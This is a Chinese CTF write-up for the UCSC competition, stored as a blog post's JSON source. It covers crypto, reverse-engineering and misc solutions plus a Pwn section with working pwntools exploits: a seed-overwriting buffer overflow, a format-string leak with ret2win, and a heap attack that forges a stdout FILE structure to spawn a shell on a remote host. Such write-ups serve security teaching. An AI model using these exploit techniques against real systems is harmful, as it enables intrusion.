0x67, 0x47,\n            0x69, 0x15, 0x42, 0x75, 0x65, 0x40, 0x76, 0x61, 0x56, 0x41,\n            0x11, 0x44, 0x7F, 0x19, 0x65, 0x4C, 0x40, 0x48, 0x65, 0x60,\n            0x01, 0x40, 0x50, 0x01, 0x61, 0x6F, 0x69, 0x57};\n\n    unsigned char Dec[100]{};\n    decrypt((BYTE *)Enc, 58, (BYTE *)Dec);\n\n    printf(\"%.58s\\n\", Dec);\n    return 0;\n}\n//mPWV7et2RTxobH5Tn8iqGSdFWc5vYzps1jHuynpvpfmsmxeL9K28H1L1xs\n```\n\n![img](/images/1745240699574-4.png)\n\n### easy_re-ucsc\n\n![img](/images/1745240699574-5.png)\n\n![img](/images/1745240699574-6.png)\n\n异或加密\n\n```c++\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <vector>\n\nint main()\n{\n    unsigned char a[] = \"n=<;:h2<'?8:?'9hl9'h:l>'2>>2>hk=>;:?\";\n    for (int i = 0; i < 36; i++)\n        a[i] ^= 10;\n    printf(\"%.37s\\n\", a);\n    // d7610b86-5205-3bf3-b0f4-84484ba74105\n    return 0;\n}\n```\n\n### EZ_debug-ucsc\n\n断点此处单步运行得到flag\n\n![img](/images/1745240699574-7.png)\n\n![img](/images/1745240699575-8.png)\n\n### re_ez-ucsc\n\n单步跟到主要函数\n\n这边循环输入字符，判断(Inputchar - 32)^3是否<4，这边可以得出一共就四个符合条件的字符\n\n```C++\n' ', '!', '\\\"', '#'\n```\n\n要经过一系列输入数据，并且数据变换最终要v0==3，然后输出以下内容。\n\n![img](/images/1745240699575-9.png)\n\n![img](/images/1745240699575-10.png)\n\n输入的字符串md5就是flag。\n\n那么直接爆破输入，让最后v0等于3即可得到目标系列字符串。\n\n```c++\n#include <iostream>\n#include <vector>\n#include <string>\n#include <functional>\n\nint main()\n{\n    unsigned long long k[5] = {\n        0xFFFFFFFFFFFFFFFB, 0x0000000000000005, 0xFFFFFFFFFFFFFFFF, 0x0000000000000001,\n        0x0000000000000000};\n\n    char chars[4] = {'#', '\"', '!', ' '};\n    for (int len = 1; len <= 10; len++)\n    {\n        std::vector<std::vector<int>> combinations;\n        std::vector<int> current(len);\n\n        std::function<void(int)> generate = [&](int pos)\n        {\n            if (pos == len)\n            {\n                combinations.push_back(current);\n                return;\n            }\n\n            for (int i = 0; i < 4; i++)\n            {\n                current[pos] = i;\n                generate(pos + 1);\n            }\n        };\n\n        generate(0);\n\n        for (const auto &comb : combinations)\n        {\n            unsigned int map[25] = {\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000001,\n                0x00000001, 0x00000001, 0x00000001, 0x00000001, 0x00000001};\n\n            unsigned long long v0 = 1;\n            std::string a;\n            bool valid = true;\n\n            for (int i = 0; i < len; i++)\n            {\n                char c = chars[comb[i]];\n                a.push_back(c);\n\n                uint8_t v = c;\n                uint8_t v13 = (v - 32) ^ 3;\n                v0 += k[v13];\n\n                if (v0 > 0x18 || map[v0])\n                {\n                    valid = false;\n                    break;\n                }\n\n                map[v0] = 1;\n\n                if (v0 == 3)\n                {\n                    std::cout << a << std::endl;\n                    return 0;\n                }\n            }\n        }\n    }\n    return 0;\n}\n// \"\"\"  ###\n```\n\n![img](/images/1745240699575-11.png)\n\n# Pwn\n\n### **BoFido-ucsc**\n\n开始输入有溢出，可以把随机种子改为任意值。把种子设为0这样就能通关了\n\nexp\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\n#io=remote(\"dicec.tf\", 32030)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n        gdb.attach(io, gdbscript=script)\n\ndef bunny(idx):\n        sla(\">\", str(idx))\n        #idx=idx\n\nans=\"\"\n\nval=[]\npredict=process([\"./predict\", \"100\"])\nfor i in range(100):\n        a=predict.recvline(False)\n        #print hex(int(a[1]))\n        val.append(int(a))\n\nio=remote(\"39.107.58.236\", 44590)\n#io=process(\"./BoFido\")\n\np=\"A\"*20+p64(0)*2\nsa(\":\", p)\n\nfor i in range(0, 30, 3):\n        p=str(val[i])+\" \"+str(val[i+1])+\" \"+str(val[i+2])\n        sl(p)\n\nshell()\n```\n\n预判exp\n\n```c++\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <time.h>\n#include <unistd.h>\n\nint main(int argc, char * argv[]){\n        uint8_t dmg;\n\n        for(int i=0;i<atoi(argv[1]);i++){\n                //int item = rand() % 4;\n                dmg = rand() % 255;\n                printf(\"%d\\n\", dmg);\n        }\n}\n```\n\n### **userlogin-ucsc**\n\n登陆普通用户有格式化字符串漏洞，泄漏root密码打ret2win\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"\")\nio=remote(\"39.107.58.236\", 42744)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n        gdb.attach(io, gdbscript=script)\n\nsla(\":\", \"supersecureuser\")\nrl()\nsl(\"%13$s\")\nroot=rl()\nprint root\n\nrop=\"A\"*40+p64(0x0401276)+p64(0x0401261)\n\nsla(\":\", root)\nsla(\":\", rop)\n\n\nshell()\n```\n\n### **疯狂复制-ucsc**\n\nedit函数有整数溢出，添负数可以控制stdout和stdin结构题。先塞满0x90的tcache，再释放0x90大小的堆块来让他到unsorted bin，再创在一个堆块来拿到libc泄漏，最后更改stdout打io。\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\nlibc=ELF(\"./libc.so.6\")\nio=remote(\"39.107.58.236\", 45181)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n        gdb.attach(io, gdbscript=script)\n\ndef add(idx, size):\n        sla(\":\", \"1\")\n        sla(\":\", str(idx))\n        sla(\"Size\", str(size))\n\ndef edit(idx, content):\n        sla(\":\", \"2\")\n        sla(\":\", str(idx))\n        sla(\":\", content)\n\ndef free(idx):\n        sla(\":\", \"4\")\n        sla(\":\", str(idx))\n\ndef view(idx):\n        sla(\":\", \"3\")\n        sla(\":\", str(idx))\n\nfor i in range(8):\n        add(i, 0x80)\nadd(8, 0x10)\n\nfor i in range(8):\n        free(i)\n\nadd(0, 0x30)\nview(0)\nru(\": \")\nlibc.address=u64(r(6).ljust(8, \"\\0\"))-0x3ebd20\nprint hex(libc.address)\n\n\"\"\"\nfake_io=flat({\n        0x0: \" sh;\",\n        0x68: libc.symbols['system'],\n        0x88: libc.sym[\"environ\"]-0x10,\n        0xa0: libc.symbols['_IO_2_1_stdout_'],\n        0xd8: libc.sym[\"_IO_wfile_jumps\"]-0x20,\n        0xe0: libc.symbols['_IO_2_1_stdout_']\n}, filler=\"\\0\")\n\"\"\"\n\nfake_io = flat({\n    0x0: b'  sh;',\n    0x8: libc.symbols['_IO_2_1_stdout_'] - 0x10,\n    0x28: libc.symbols['system'],\n    0x68: libc.symbols['system'],\n    0x88: libc.symbols['_environ']-0x10,\n    0xa0: libc.symbols['_IO_2_1_stdout_'] - 0x60,\n    0xd0: libc.symbols['_IO_2_1_stdout_'],\n    0xd8: libc.symbols['_IO_wfile_jumps'] - 0x20,\n}, filler=b\"\\x00\")\n\n\nfree(0)\nfree(8)\nfor i in range(32):\n        add(i, 0x20)\n\n#debug(\"break *_IO_wdoallocbuf\\nc\")\nedit(-4, fake_io)\n#debug()\nshell()\n```\n\n# Misc\n\n### **USB-ucsc**\n\nCTF-NetA一把梭\n\n![img](/images/1745240699575-12.png)\n\nflag{ebdfea9b-3469-41c7-9070-d7833ecc6102}\n\n### **小套不是套-ucsc**\n\n对套.zip执行CRC32爆破。\n\n代码：\n\n```python\nfrom binascii import crc32\nimport string\nimport zipfile\ndic=string.printable\ndef CrackCrc(crc):\n    for i in dic :\n        # print (i)\n        for j in dic:\n            for p in dic:\n                for q in dic:\n                    s=i+j+p+q\n                    # print (crc32(bytes(s,'ascii')) & 0xffffffff)\n                    if crc == (crc32(bytes(s,'ascii')) & 0xffffffff):\n                        print (s)\n                        return\n \ndef getcrc32(fname):\n    l=[]\n    file = fname\n    f = zipfile.ZipFile(file, 'r')\n    global fileList\n    fileList =f.namelist ()\n    print (fileList)\n    # print (type(fileList))\n    for filename in fileList:\n        Fileinfo = f.getinfo(filename)\n        # print(Fileinfo)\n        crc = Fileinfo.CRC\n        # print ('crc',crc)\n        l.append(crc)\n    return l\n \ndef main (filename=None):\n    l = getcrc32(filename)\n    # print(l)\n    for i in range(len(l)):\n        print(fileList[i], end='的内容是:')\n        CrackCrc(l[i])\n \nif __name__  == \"__main__\":\n    main ('test.zip')\n```\n\n![img](/images/1745240699575-13.png)\n\n按照f后面数字的顺序拼接起来，随后cyberchef一把梭：\n\n![img](/images/1745240699575-14.png)\n\n另一个压缩包打开之后里面还有一个压缩包，伪加密解出来是一张图：\n\n![img](/images/1745240699575-15.jpeg)\n\n010，发现还有一张图。\n\n![img](/images/1745240699575-16.png)\n\n补一下png头。能搞出来另外一张图：\n\n![img](/images/1745240699575-17.png)\n\nIEDN后面就是oursecret加密的特征\n\n![img](/images/1745240699575-18.png)\n\n结合上面的密钥。oursecret解出flag。\n\n![img](/images/1745240699575-19.png)\n\n### **three-ucsc**\n\npart1:8f02d3e7\n\n![img](/images/1745240699575-20.png)\n\n![img](/images/1745240699575-21.png)\n\npart2:-ce89-4d6b-830e-\n\n![img](/images/1745240699575-22.png)\n\npart3:5d0cb5695077\n\n压缩包密码thinkbell\n\n![img](/images/1745240699575-23.png)\n\n### No.shArk-ucsc\n\n![img](/images/1745240699575-24.png)\n\n流量中存在0101数据，转成二维码，修复完二维码扫描得到一个字符串\"Y0U_Fi8d_ItHa@aaHH\"。\n\n![img](/images/1745240699575-25.png)\n\n![img](/images/1745240699575-26.png)\n\n流量中提取出三个文件和一个存在SNOW数据的html。\n\n发现有SNOW隐写提示，使用SNOW解密出后半部分flag。\n\n![img](/images/1745240699575-27.png)\n\n![img](/images/1745240699575-28.png)\n\n![img](/images/1745240699576-29.png)\n\n结合提示，猜测另一个png图是要用Arnold Cat map变化来爆破出正确flag图。\n\n百度找到的脚本直接可用（https://www.cnblogs.com/alexander17/p/18551089）。\n\n```python\nimport matplotlib.pyplot as plt\nimport cv2\nimport numpy as np\n\ndef arnold_decode(image, shuffle_times, a, b):\n    \"\"\" decode for rgb image that encoded by Arnold\n    Args:\n        image: rgb image encoded by Arnold\n        shuffle_times: how many times to shuffle\n    Returns:\n        decode image\n    \"\"\"\n    # 1:创建新图像\n    decode_image = np.zeros(shape=image.shape)\n    # 2：计算N\n    h, w = image.shape[0], image.shape[1]\n    N = h  # 或N=w\n\n    # 3：遍历像素坐标变换\n    for time in range(shuffle_times):\n        for ori_x in range(h):\n            for ori_y in range(w):\n                # 按照公式坐标变换\n                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N\n                new_y = ((-a) * ori_x + ori_y) % N\n                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]\n        image = np.copy(decode_image)\n        \n    return image\n\ndef arnold_brute(image,shuffle_times_range,a_range,b_range):\n    for c in range(shuffle_times_range[0],shuffle_times_range[1]):\n        for a in range(a_range[0],a_range[1]):\n            for b in range(b_range[0],b_range[1]):\n                print(f\"[+] Trying shuffle_times={c} a={a} b={b}\")\n                decoded_img = arnold_decode(image,c,a,b)\n                output_filename = f\"flag_decodedc{c}_a{a}_b{b}.png\"\n                cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])\n                \nif __name__ == \"__main__\":\n    img = cv2.imread(\"cat.png\")\n    arnold_brute(img, (1,8), (1,12), (1,12))\n```\n\n![img](/images/1745240699576-30.png)\n\n![img](/images/1745240699576-31.png)\n","source":"_posts/ucsc-不知道-WP.md","raw":"---\ntitle: ucsc 不知道 WP\ndate: 2025-04-21 21:00:49\ntags: [cry,web,re,pwn,misc]\ncategories: wp\ntypora-root-url: ./..\n---\n\n# 战队名：不知道\n\n**排名**：**1**\n\n![7918DA86D3B117713C82E1F48AA03B79](/images/7918DA86D3B117713C82E1F48AA03B79-1745240699577-65.png)\n\n# Crypto\n\n### **XR4-ucsc**\n\n已知密钥，修改random_num逻辑异或回去即可\n\n```python\nimport base64\nimport random\n# from secret import flag\nimport numpy as np\ndef init_sbox(key):\n    s_box = list(range(256))\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    return s_box\ndef decrypt(cipher, box):\n    res = []\n    i = j = 0\n    cipher_bytes = base64.b64decode(cipher)\n    for s in cipher_bytes:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(s ^ k))\n    return (''.join(res))\ndef random_num(seed_num):\n    random.seed(seed_num)\n    for i in range(6):\n        for j in range(6):\n            print(chr(int(str(random.random()*10000)[0:2]) ^ (transposed_matrix[j][i])),end='')\n\nif __name__ == '__main__':\n    transposed_matrix=[\n[  1 ,111 , 38, 110 , 95 , 44],\n[ 11,  45  ,58,  39  ,84,   1],\n[116 , 19 ,113 , 60  ,91 ,118],\n[ 33  ,98  ,38  ,57  ,10 , 29],\n[ 68  ,52 ,119  ,56 , 43 ,125],\n[ 32  ,32,   7  ,26,  41 , 41]]\n        \n    ciphertext = \"MjM184anvdA=\"\n    key = \"XR4\"\n    box = init_sbox(key)\n    a=decrypt(ciphertext, box)\n    print(a)\n    random_num(int(a))\n```\n\n### **essential-ucsc**\n\n```c++\nfrom Crypto.Util.number import *\nimport sympy\nfrom flag import flag\n\na=getPrime(512)\np=sympy.nextprime(13*a)\nq=sympy.prevprime(25*a)\nnumber2=p*q\n\ndef crypto01(number1, number2, number3):\n    number4 = 1\n    while number2 > 0:\n        if number2 % 2: \n            number4 = (number4 * number1) % number3\n        number1 = number1 ** 2 % number3\n        number2 //= 2\n    return number4\n\ndef crypto02(number1, number2):\n    number3 = number1\n    number4 = number2\n    giao = 1\n    giaogiao = 0\n    while number4 > 0:\n        number7 = number3 // number4\n        giao, giaogiao = giaogiao, giao - giaogiao*number7\n        number3, number4 = number4, number3 - number4*number7\n    while giao<0:\n        giao = giao + number2\n    return giao\n\ndef crypto03(number1, number2, number3):\n    number4 = crypto01(number3, number1, number2)\n    return number4\n\ndef crypto05(number1,number2):\n    return pow(number1,0xe18e,number2)\n\nnumber3 = int.from_bytes(flag[0:19].encode(\"utf-8\"), \"big\")\nnumber4 = int.from_bytes(flag[19:39].encode(\"utf-8\"), \"big\")\n\nprint(crypto03(number1, number2, number3))\nprint(crypto05(number4,number2))\n```\n\n简单看出给出的值为 n3^n1 %n2 和 n4 ^ 0xe18e % n2 \n\n前一个因为p，q的值与a相关，除以因子后开方得到近似值，第二部分因为flag长度较小，直接开方得到flag\n\n```python\nfrom Crypto.Util.number import *\nnumber1 = 6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683\nnumber2 = 20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947\n\n# n3^n1 %n2\nc1=6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076\n# n4 ^ 0xe18e % n2\nc2=204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766\nfrom gmpy2 import *\n\na=gmpy2.iroot(number2//(13*25),2)[0]\np=sympy.nextprime(13*a)\nprint(p)\nprint(number2%p)\nq=number2//p\n\nphi=(p-1)*(q-1)\nd1=inverse(number1,phi)\nprint(GCD(0xe18e,phi))\n\nd2=inverse(0xe18e//2,phi)\nm2=pow(c2,d2,number2)\n\nf2=int(gmpy2.iroot(m2,2)[0])\n\nf1=pow(c1,d1,number2)\nflag=long_to_bytes(f1)+long_to_bytes(f2)\nprint(flag)\n```\n\n### **MERGE_ECC--ucsc**\n\n```python\nimport random\nfrom sympy import nextprime\ndef part1():\n    p = random_prime(2^512, 2^513)\n    a = random.randint(0, p-1)\n    b = random.randint(0, p-1)\n    while (4 * a**3 + 27 * b**2) % p == 0:\n        a = random.randint(0, p-1)\n        b = random.randint(0, p-1)\n\n    E = EllipticCurve(GF(p), [a, b])\n\n    P=E.random_point()\n\n    n = [random.randint(1, 2**20) for _ in range(3)] \n    assert part1=''.join([hex(i)[2:] for i in n])\n    cipher = [n[i] * P for i in range(3)]\n\n    print(f\"N = {p}\")\n    print(f\"a = {a}, b = {b}\")\n    print(f\"P = {P}\")\n\n    for i in range(3):\n        print(f\"cipher{i} = {cipher[i]}\")\n\ndef part2():\n    p =  839252355769732556552066312852886325703283133710701931092148932185749211043\n    a =  166868889451291853349533652847942310373752202024350091562181659031084638450\n    b =  168504858955716283284333002385667234985259576554000582655928538041193311381\n    P = E.random_point()\n    Q = key*P\n    print(\"p = \",p)\n    print(\"a = \",a)\n    print(\"b = \",b)\n    print(\"P = \",P)\n    print(\"Q = \",Q)\n    assert part2=key\n\npart1()\nprint(\"-------------------------------------------\")\npart2()\nassert flag=\"flag{\"+str(part1)+\"-\"+str(part2)+\"}\"\n```\n\npart1：发现n = [random.randint(1, 2**20) for _ in range(3)] ，在可以爆破的范围，直接爆破出n即可\n\npart2：数字较小直接求离散对数即可\n\n```python\nN = 8186762541745429544201163537921168767557829030115874801599552603320381728161132002130533050721684554609459754424458805702284922582219134865036743485620797\na = 1495420997701481377470828570661032998514190598989197201754979317255564287604311958150666812378959018880028977121896929545639701195491870774156958755735447\nb = 5991466901412408757938889677965118882508317970919705053385317474407117921506012065861844241307270755999163280442524251782766457119443496954015171881396147\nE1 = EllipticCurve(GF(N), [a, b])\nP = E1(6053058761132539206566092359337778642106843252217768817197593657660613775577674830119685211727923302909194735842939382758409841779476679807381619373546323 , 7059796954840479182074296506322819844555365317950589431690683736872390418673951275875742138479119268529134101923865062199776716582160225918885119415223226 )\n\ncipher0 = E1(4408587937721811766304285221308758024881057826193901720202053016482471785595442728924925855745045433966244594468163087104593409425316538804577603801023861 , 5036207336371623412617556622231677184152618465739959524167001889273208946091746905245078901669335908442289383798546066844566618503786766455892065155724816 )\ncipher1 = E1(2656427748146837510897512086140712942840881743356863380855689945832188909581954790770797146584513962618190767634822273749569907212145053676352384889228875 , 4010263650619965046904980178893999473955022015118149348183137418914551275841596653682626506158128955577872592363930977349664669161585732323838763793957500 )\ncipher2 = E1(1836350123050832793309451054411760401335561429787905037706697802971381859410503854213212757333551949694177845513529651742217132039482986693213175074097638 , 1647556471109115097539227566131273446643532340029032358996281388864842086424490493200350147689138143951529796293632149050896423880108194903604646084656434 )\ncipher=[cipher0,cipher1,cipher2]\n'''n=[]\nfrom tqdm import tqdm\nfor k in tqdm(range(2**12,2**20)):\n    if k*P in cipher:\n            n.append(int(k))\n    if len(n)==3:\n        break\n\nprint(n)'''\nn=[651602, 943532, 1008061]\npart1=''.join([hex(i)[2:] for i in n])\nprint(part1)\n\np2 =  839252355769732556552066312852886325703283133710701931092148932185749211043\na2 =  166868889451291853349533652847942310373752202024350091562181659031084638450\nb2 =  168504858955716283284333002385667234985259576554000582655928538041193311381\nE2 = EllipticCurve(GF(p2), [a2, b2])\nP2 =  E2(547842233959736088159936218561804098153493246314301816190854370687622130932 , 259351987899983557442340376413545600148150183183773375317113786808135411950)\nQ =  E2(52509027983019069214323702207915994504051708473855890224511139305828303028 , 520507172059483331872189759719244369795616990414416040196069632909579234481)\n\nkey=P2.discrete_log(Q)\nprint(int(key))\n\nkey1=[1,1,1]\nfor i in range(len(n)):\n    for j in  range(len(cipher)):\n        if n[i]*P==cipher[j]:\n            key1[j]=n[i]\nprint(key1)\n\npart1=''.join([hex(i)[2:] for i in key1])\n\nflag=\"flag{\"+str(part1)+\"-\"+str(key)+\"}\"\nprint(flag)\n```\n\n### **Ez_Calculate-ucsc**\n\n```python\nfrom Crypto.Util.number import *\nfrom random import randint\nfrom hashlib import md5\n\nflag1 = b'xxx'\nflag2 = b'xxx'\nFlags = 'flag{' + md5(flag1+flag2).hexdigest()[::-1] + '}'\n\ndef backpack_encrypt_flag(flag_bytes, M, group_len):\n    bits = []\n    for byte in flag_bytes:\n        bits.extend([int(b) for b in format(byte, \"08b\")])\n\n    while len(bits) % group_len != 0:\n        bits.append(0)\n\n    S_list = []\n    for i in range(0, len(bits), group_len):\n        group = bits[i:i + group_len]\n        S = sum(bit * m for bit, m in zip(group, M))\n        S_list.append(S)\n    return S_list\n\ndef backpack(flag_bytes):\n    R = [10]\n    while len(R) < 8:\n        next_val = randint(2 * R[-1], 3 * R[-1])\n        R.append(next_val)\n    B = randint(2 * R[-1] + 1, 3 * R[-1])\n    A = getPrime(100)\n    M = [A * ri % B for ri in R]\n    S_list = backpack_encrypt_flag(flag_bytes, M, len(M))\n    return R, A, B, M, S_list\n\np = getPrime(512)\nq = getPrime(512)\nn = p*q\ne = 0x10000\nm = bytes_to_long(flag1)\nk = randint(1, 999)\nproblem1 = (pow(p,e,n)-pow(q,e,n)) % n\nproblem2 = pow(p-q,e,n)*pow(e,k,n)\nc = pow(m,e,n)\n\nR, A, B, M, S_list = backpack(flag2)\n\nwith open(r\"C:\\Users\\Rebirth\\Desktop\\data.txt\", \"w\") as f:\n    f.write(f\"problem1 = {problem1}\\n\")\n    f.write(f\"problem2 = {problem2}\\n\")\n    f.write(f\"n = {n}\\n\")\n    f.write(f\"c = {c}\\n\")\n    f.write(\"-------------------------\\n\")\n    f.write(f\"R = {R}\\n\")\n    f.write(f\"A = {A}\\n\")\n    f.write(f\"B = {B}\\n\")\n    f.write(f\"M = {M}\\n\")\n    f.write(f\"S_list = {S_list}\\n\")\n    f.write(\"-------------------------\\n\")\n    f.write(f\"What you need to submit is Flags!\\n\")\n```\n\n分两部分，第一部分e=2**16，使用Tonelli–Shanks以及中国剩余定理求解m\n\n第二部分是普通的超递增背包，求解即可\n\n```python\nfrom Crypto.Util.number import *\nfrom random import randint\nfrom hashlib import md5\n\ne=int(0x10000)\nproblem1 = 24819077530766367166035941051823834496451802693325219476153953490742162231345380863781267094224914358021972805811737102184859249919313532073566493054398702269142565372985584818560322911207851760003915310535736092154713396343146403645986926080307669092998175883480679019195392639696872929250699367519967334248\nproblem2 = 20047847761237831029338089120460407946040166929398007572321747488189673799484690384806832406317298893135216999267808940360773991216254295946086409441877930687132524014042802810607804699235064733393301861594858928571425025486900981252230771735969897010173299098677357738890813870488373321839371734457780977243838253195895485537023584305192701526016\nn = 86262122894918669428795269753754618836562727502569381672630582848166228286806362453183099819771689423205156909662196526762880078792845161061353312693752568577607175166060900619163231849790003982326663277243409696279313372337685740601191870965951317590823292785776887874472943335746122798330609540525922467021\nc = 74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776\n\nR = [10, 29, 83, 227, 506, 1372, 3042, 6163]\nA = 1253412688290469788410859162653\nB = 16036\nM = [10294, 12213, 10071, 4359, 1310, 4376, 7622, 14783]\nS_list = [13523, 32682, 38977, 44663, 43353, 31372, 17899, 17899, 44663, 16589, 40304, 25521, 31372]\n\nfor k in range(999):\n    e_pow_k = pow(e, k, n)\n    term = (problem1 * e_pow_k) % n\n    candidate = (problem2 + term) % n\n    g = GCD(candidate, n)\n    if g != 1:\n        p=int(g)\n        q=int(n//g)\n        break\n    \nprint(p,q)\nprint(n%p)\nprint(n%q)\n\ndef tonelli_shanks(a, p):\n    Q = p - 1\n    S = 0\n    while Q % 2 == 0:\n        Q //= 2\n        S += 1\n    z = Integer(2)\n    while kronecker_symbol(z, p) != -1:\n        z += 1\n    M = S\n    c_val = power_mod(z, Q, p)\n    t = power_mod(a, Q, p)\n    R = power_mod(a, (Q + 1) // 2, p)\n  \n    while t != 1:\n        i = next(i for i in range(1, M) if power_mod(t, 2**i, p) == 1)\n        b = power_mod(c_val, 2**(M - i - 1), p)\n     \n        R = (R * b) % p\n        t = (t * b * b) % p\n        c_val = (b * b) % p\n        M = i\n    return [Integer(R), Integer(p - R)]\n\ndef eth_root_prime(c_val, p, e_power):\n    assert e_power & (e_power - 1) == 0, \"e 必须为 2 的幂\"\n    k = e_power.bit_length() - 1\n    roots = [Integer(c_val) % p]\n    for _ in range(k):\n        new_roots = []\n        for r in roots:\n            r_mod = Integer(r) % p\n            if r_mod in (0, 1):\n                new_roots.append(r_mod)\n                if r_mod == 1:\n                    new_roots.append(p - 1)\n            else:\n                if kronecker_symbol(r_mod, p) == 1:\n                    sqs = tonelli_shanks(r_mod, p)\n                    new_roots.extend(sqs)\n        roots = list({Integer(x) for x in new_roots})\n    return roots\n\n\ndef recover_plaintexts(c, p, q, e=2**16):\n    roots_p = eth_root_prime(c % p, p, e)\n    roots_q = eth_root_prime(c % q, q, e)\n    candidates = []\n    for rp in roots_p:\n        for rq in roots_q:\n            m = crt([rp, rq], [p, q])\n            candidates.append(m)\n    return candidates\n\nm=recover_plaintexts(c, p, q)\n\nA_inv = inverse(A, B)\nS_primes = [(S * A_inv) % B for S in S_list]\n\nbits = []\nfor s_prime in S_primes:\n    group_bits = []\n    remaining = s_prime\n    for r in reversed(R):\n        if remaining >= r:\n            group_bits.append(1)\n            remaining -= r\n        else:\n            group_bits.append(0)\n    group_bits = group_bits[::-1]\n    bits.extend(group_bits)\n\nflag2 = bytearray()\nfor i in range(0, len(bits), 8):\n    byte_bits = bits[i:i+8]\n    byte = 0\n    for bit in byte_bits:\n        byte = (byte << 1) | bit\n    flag2.append(byte)\n\nflag2 = bytes(flag2).rstrip(b'\\x00')\nprint(\"flag2 =\", flag2)\n\nfor i in m:\n    f1=long_to_bytes(i)\n    print(f1)\n    Flags = 'flag{' + md5(f1+flag2).hexdigest()[::-1] + '}'\n    print(Flags)\n```\n\n# Web\n\n### **ezLaravel-ucsc**\n\nDirsearch出\n\n![img](/images/1745240699576-32.png)\n\n访问flag.php得到flag\n\n# Reverse\n\n### simplere-ucsc\n\nUPX壳，直接dbg+dump即可脱壳。\n\nBase58换表加密\n\n![img](/images/1745240699574-1.png)\n\n![img](/images/1745240699574-2.png)\n\n数据倒转异或加密\n\n![img](/images/1745240699574-3.png)\n\n```C++\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <vector>\n\nunsigned __int64 decrypt(BYTE *encrypted, unsigned __int64 strlen_, BYTE *decrypted)\n{\n    unsigned __int64 i;\n\n    for (i = 0; i < strlen_; i++)\n    {\n        decrypted[strlen_ - i - 1] = encrypted[i] ^ (i + 1);\n    }\n    return i;\n}\n\nint main()\n{\n    unsigned char Enc[] =\n        {\n            0x72, 0x7A, 0x32, 0x48, 0x34, 0x4E, 0x3F, 0x3A, 0x42, 0x33,\n            0x47, 0x69, 0x75, 0x63, 0x7C, 0x7D, 0x77, 0x62, 0x65, 0x64,\n            0x7B, 0x6F, 0x62, 0x50, 0x73, 0x2B, 0x68, 0x6C, 0x67, 0x47,\n            0x69, 0x15, 0x42, 0x75, 0x65, 0x40, 0x76, 0x61, 0x56, 0x41,\n            0x11, 0x44, 0x7F, 0x19, 0x65, 0x4C, 0x40, 0x48, 0x65, 0x60,\n            0x01, 0x40, 0x50, 0x01, 0x61, 0x6F, 0x69, 0x57};\n\n    unsigned char Dec[100]{};\n    decrypt((BYTE *)Enc, 58, (BYTE *)Dec);\n\n    printf(\"%.58s\\n\", Dec);\n    return 0;\n}\n//mPWV7et2RTxobH5Tn8iqGSdFWc5vYzps1jHuynpvpfmsmxeL9K28H1L1xs\n```\n\n![img](/images/1745240699574-4.png)\n\n### easy_re-ucsc\n\n![img](/images/1745240699574-5.png)\n\n![img](/images/1745240699574-6.png)\n\n异或加密\n\n```c++\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <vector>\n\nint main()\n{\n    unsigned char a[] = 